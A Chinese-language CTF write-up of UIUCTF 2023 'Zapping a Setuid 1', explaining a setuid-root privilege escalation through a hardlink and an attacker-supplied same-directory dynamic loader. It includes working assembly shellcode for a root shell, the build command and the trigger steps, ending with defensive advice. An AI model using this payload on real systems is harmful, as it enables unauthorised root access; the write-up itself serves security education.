# UIUCTF 2023 Zapping a Setuid 1 Writeup

## 题目简述

题目中的 `Zapps` 可执行文件不使用 ELF `PT_INTERP` 让内核启动动态加载器，而是在自定义入口中读取 `/proc/self/exe`，取可执行文件所在目录，再手动打开同目录的 `ld-linux-x86-64.so.2`：

```c
readlink("/proc/self/exe", path, PATH_MAX);
*strrchr(path, '/') = '\0';
strcat(path, "/ld-linux-x86-64.so.2");
open(path, O_RDONLY | O_CLOEXEC);
```

目标 `zapps/build/exe` 是 root 拥有的 setuid 文件。系统特意设置 `fs.protected_hardlinks=0`，重新开放了与 CVE-2009-0876 同类的旧式硬链接风险。

## 解题过程

### 1. 用硬链接改变 `/proc/self/exe` 的路径

文件所有者、权限和 setuid 位属于 inode。创建硬链接只增加一个指向同一 inode 的目录项，因此新路径仍是同一个 setuid-root 程序。

```bash
ln zapps/build/exe exe
ls -li zapps/build/exe exe
```

两个路径应显示相同 inode。执行当前目录下的 `./exe` 时，`/proc/self/exe` 解析为 `/home/user/exe`，Zapps 随后会从攻击者可写的 `/home/user` 加载 `ld-linux-x86-64.so.2`。

现代系统的 `fs.protected_hardlinks=1` 通常会禁止普通用户给不属于自己的 setuid 文件创建硬链接；本题第一版明确关闭了这项保护。

### 2. 制作恶意同目录加载器

自定义加载器只需获得 root shell。setuid 执行最初只保证 EUID 为 0，RUID 仍是普通用户；BusyBox shell 可能据此主动降权，所以载荷先调用 `setuid(0)`，再执行 `/bin/sh`。同时提供 `argv[0]="/////ash"`，让 BusyBox 识别 `ash` applet。

```asm
.globl _start
.section .text,"ax",@progbits
.type _start, @function
_start:
.cfi_startproc
    xor %rdi, %rdi
    mov $105, %al              # setuid(0)
    syscall

    xor %rsi, %rsi
    push %rsi
    mov $0x6873612f2f2f2f2f, %rsi  # "/////ash\0"
    push %rsi
    mov %rsp, %rdi

    xor %rsi, %rsi
    push %rsi
    push %rdi
    mov %rsp, %rsi             # argv = {"/////ash", NULL}

    xor %rdx, %rdx
    push %rdx
    mov $0x68732f2f6e69622f, %rdi  # "/bin//sh"
    push %rdi
    mov %rsp, %rdi

    mov $59, %al               # execve
    cdq
    syscall
.cfi_endproc
```

把它编译成 Zapps 能手动映射的静态 PIE，并使用预期文件名：

```bash
gcc -o ld-linux-x86-64.so.2 \
    -static-pie -nostartfiles -Wl,--gc-sections payload.S
```

### 3. 触发

```bash
./exe
id
cat /mnt/flag
```

自定义 Zapps 入口在 setuid 上下文中加载当前目录的恶意“动态加载器”，得到 root shell：

```text
uiuctf{did-you-see-why-its-in-usr-lib-now-0cd5fb56}
```

## 方法总结

利用链是 `关闭 protected_hardlinks → 给 setuid inode 创建用户目录硬链接 → /proc/self/exe 返回攻击者选择的路径 → 自定义加载器从同目录取文件 → root 执行恶意 ld.so`。标准 glibc 在 `AT_SECURE` 模式下只信任受保护目录中的 `$ORIGIN` 展开；自定义加载逻辑绕开了这层约束。高权限程序不应根据可由调用者影响的执行路径加载相邻代码，系统也应保持 `fs.protected_hardlinks=1`。
